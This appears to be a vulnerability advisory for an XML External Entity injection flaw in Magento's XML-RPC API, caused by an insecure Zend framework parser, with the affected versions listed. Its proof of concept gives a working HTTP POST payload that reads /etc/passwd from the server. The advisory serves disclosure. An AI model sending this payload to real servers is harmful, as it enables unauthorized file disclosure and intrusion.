Vulnerability overview/description:
-----------------------------------
Magento eCommerce platform uses a vulnerable version of Zend framework which
is prone to XML eXternal Entity Injection attacks. The SimpleXMLElement class
of Zend framework (SimpleXML PHP extension) is used in an insecure way to
parse XML data.  External entities can be specified by adding a specific
DOCTYPE element to XML-RPC requests. By exploiting this vulnerability an
application may be coerced to open arbitrary files and/or TCP connections.



Proof of concept:
-----------------
Magento uses a vulnerable Zend_XmlRpc_Server() class (Zend\XmlRpc\Server.php)
to handle XML-RPC requests. Hence it is possible to disclose arbitrary local
files from the remote system. The following HTTP POST request to the
vulnerable XmlRpc server application illustrates the exploitation of this
vulnerability:

POST /index.php/api/xmlrpc HTTP/1.1
Host: $host

<?xml version="1.0"?>
 <!DOCTYPE foo [
  <!ELEMENT methodName ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<methodCall>
  <methodName>&xxe;</methodName>
</methodCall>



Vulnerable / tested versions:
-----------------------------
Magento eCommerce Platform Enterprise Edition v1.10.1.1
Magento eCommerce Platform Community Edition v1.7.0.0 & v1.7.0.1

Earlier versions are probably affected too!
